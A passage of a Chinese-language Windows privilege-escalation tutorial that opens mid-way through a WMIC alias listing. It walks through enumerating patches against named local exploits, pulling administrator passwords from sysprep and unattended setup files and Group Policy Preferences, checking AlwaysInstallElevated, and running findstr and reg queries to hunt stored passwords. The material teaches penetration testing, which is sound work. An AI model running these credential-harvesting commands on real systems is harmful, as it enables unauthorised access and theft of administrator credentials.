    PORTCONNECTOR            - Physical connection ports management.
    PRINTER                  - Printer device management.
    PRINTERCONFIG            - Printer device configuration management.
    PRINTJOB                 - Print job management.
    PROCESS                  - Process management.
    PRODUCT                  - Installation package task management.
    QFE                      - Quick Fix Engineering.
    QUOTASETTING             - Setting information for disk quotas on a volume.
    RDACCOUNT                - Remote Desktop connection permission management.
    RDNIC                    - Remote Desktop connection management on a specific network adapter.
    RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.
    RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.
    RECOVEROS                - Information that will be gathered from memory when the operating system fails.
    REGISTRY                 - Computer system registry management.
    SCSICONTROLLER           - SCSI Controller management.
    SERVER                   - Server information management.
    SERVICE                  - Service application management.
    SHADOWCOPY               - Shadow copy management.
    SHADOWSTORAGE            - Shadow copy storage area management.
    SHARE                    - Shared resource management.
    SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.
    SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.
    SOUNDDEV                 - Sound Device management.
    STARTUP                  - Management of commands that run automatically when users log onto the computer 
                               system.
    SYSACCOUNT               - System account management.
    SYSDRIVER                - Management of the system driver for a base service.
    SYSTEMENCLOSURE          - Physical system enclosure management.
    SYSTEMSLOT               - Management of physical connection points including ports,  slots and 
                               peripherals, and proprietary connections points.
    TAPEDRIVE                - Tape drive management.
    TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).
    TIMEZONE                 - Time zone data management.
    UPS                      - Uninterruptible power supply (UPS) management.
    USERACCOUNT              - User account management.
    VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.
    VOLUME                   - Local storage volume management.
    VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.
    VOLUMEUSERQUOTA          - Per user storage volume quota management.
    WMISET                   - WMI service operational parameters management.
    For more information on a specific alias, type: alias /?
    CLASS     - Escapes to full WMI schema.
    PATH      - Escapes to full WMI object paths.
    CONTEXT   - Displays the state of all the global switches.
    QUIT/EXIT - Exits the program.
    For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?
为了省时省力，我写了一个可以放在目标机器上，调用WMIC来提取下面信息（进程，服务，用户，用户组，网络连接，硬盘信息，网络共享信息，已安装补丁，启动项，已安装的软件，操作系统的相关信息，和时区）的脚本。
[[下载点我]](http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar)
**从t5到t6 – 快速攻陷**
在继续之前，你需要先看一下你已经搜集到的信息，下一步就是要寻找一下能被利用的系统缺陷来提升我们的权限。
首先我们要看的是是补丁修正情况，我的WMIC脚本可以列出已安装的补丁，但是你也可以通过下面这条命令来查看：
    C:Windowssystem32> wmic qfe get Caption,Description,HotFixID,InstalledOn
    Caption                                     Description      HotFixID   InstalledOn
    http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013
    http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013
    http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013
    http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013
    http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013
    http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013
    http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013
    http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013
    http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013
    http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013
    http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013
    http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013
    http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013
    http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013
    http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013
    http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013
    http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013
    http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013
    http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013
    http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013
    [..Snip..]
这些输出的结果是不能直接被利用的，最好的方式是去找权限提升的EXP并且将这些编号与EXP编号进行对比。这些EXP包括，但不限于：KiTrap0D
(KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683),
MS11-080 (KB2592799)。
如果有许多机器需要被安装，通常，一个技术员不会挨个机器手动装机。有一些自动安装的解决方案。这些方案是什么以及它们是如何工作的对我们的目的不重要，重要的是他们留下的用于安装过程的配置文件，这些安装文件包含大量的敏感信息，例如操作系统的产品密钥和管理员的密码。我们最感兴趣的就是管理员密码，因为我们可以用它来提升我们的权限。
通常的，这些目录包含这些配置文件（检查整个系统的所有文件也是不错想法）：
    c:sysprep.inf
    c:sysprepsysprep.xml
    %WINDIR%PantherUnattendUnattended.xml
    %WINDIR%PantherUnattended.xml
这些文件要么包含着明文密码，要么就是Base64加密后的密码。下面是一个例子：
sysprep.inf 文件中的明文密码：
    credentials.
    [GuiUnattended]
    OEMSkipRegional=1
    OemSkipWelcome=1
    AdminPassword=s3cr3tp4ssw0rd
    TimeZone=20
sysprep.xml 文件中的Base64加密后的密文：
    credentials. Please people Base64 is not
    encryption, I take more precautions to protect my coffee. The password here is "SuperSecurePassword".
                U3VwZXJTZWN1cmVQYXNzd29yZA==
                false
            Local Administrator
            Administrator
            Administrators
            Administrator
Unattended.xml 中同样是Base64加密后的密文：
            U3VwZXJTZWN1cmVQYXNzd29yZA==
            false
        true
        Administrator
在我们的好基友Ben Campbell的推荐下，我将获取组策略首选项（Group Policy
Preferences）保存的密码也作为快速攻陷目标机器的方式之一。GPP允许域管理员在域控制端远程向域内主机添加本地账户以方便管理。当你要攻击的计算机连接到了一个域，那么去寻找储存在SYSVOL中的Groups.xml文件是非常值得做的事。任何经过授权的用户都对该文件有读的权限。在这个xml文件中，密码是用AES加密的，但令人费解的是，在MSDN上，密码的密钥和加密方式都被公布了，这样我么就可以轻松的解密这个密码。
除了Groups.xml，其他的策略选项文件也有可选的“cPassword”属性：
例如以下这几个：
    ServicesServices.xml
    ScheduledTasksScheduledTasks.xml
    PrintersPrinters.xml
    DrivesDrives.xml
    DataSourcesDataSources.xml
这个漏洞可以手动的浏览SYSVOL文件夹，接下来我来做个示范：
然而，我们都喜欢自动的方法，这样我们可以尽可能快的完成这个操作。这里主要有两种方式，取决于我们拥有的shell类型和权限的大小。
（1）metasploit的一个模块（post/windows/gather/credentials/gpp
）[[戳我]](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)
（2）你可以使用PowerSploit[[戳我]](https://github.com/mattifestation/PowerSploit)的Get-GPPPassword功能。PowerSploit是一个强大的powershell框架，作者是Matt Graeber。
接下来的事情，我们要找一个奇怪的注册表设置“AlwaysInstallElevated”，如果这个设置被启用，它允许任何权限的用户暂时使用NT
AUTHORITYSYSTEM权限来安装*.msi文件。对我来说，你创建了一个低权限的用户（限制它们的操作系统的使用）但是给了它们使用SYSTEM权限来安装软件的能力是很奇怪的。想要进一步了解，请[[戳我]](http://www.greyhathacker.net/?p=185)
为了能够使用这种方式，我们首先要执行以下语句：
仅仅当存在键名：AlwaysInstallElevated且它的DWORD值是1才有效。
    C:Windowssystem32> reg query HKLMSOFTWAREPoliciesMicrosoftWindowsInstallerAlwaysInstallElevated
    C:Windowssystem32> reg query HKCUSOFTWAREPoliciesMicrosoftWindowsInstallerAlwaysInstallElevated
在这种情况下，我们可以获取一个SYSTEM权限的shell了。
为了完成这部分，我们将在操作系统上做一些快速的搜索，并且希望我们可以打动老天爷。
接下来的这条命令可以搜索system32下的所有名字包含以下几个关键字的文件，当然你可以手动指定关键字。
    C:Windowssystem32> dir /s *pass* == *cred* == *vnc* == *.config*
搜索某些特定的文件类型，这可能搜索到大量的结果：
    C:Windowssystem32> findstr /si password *.xml *.ini *.txt
相似的，接下来的两条命令都是用来搜索注册表的，keyword是password，你可以替换成任何你想要的。
    C:Windowssystem32> reg query HKLM /f password /t REG_SZ /s
    C:Windowssystem32> reg query HKCU /f password /t REG_SZ /s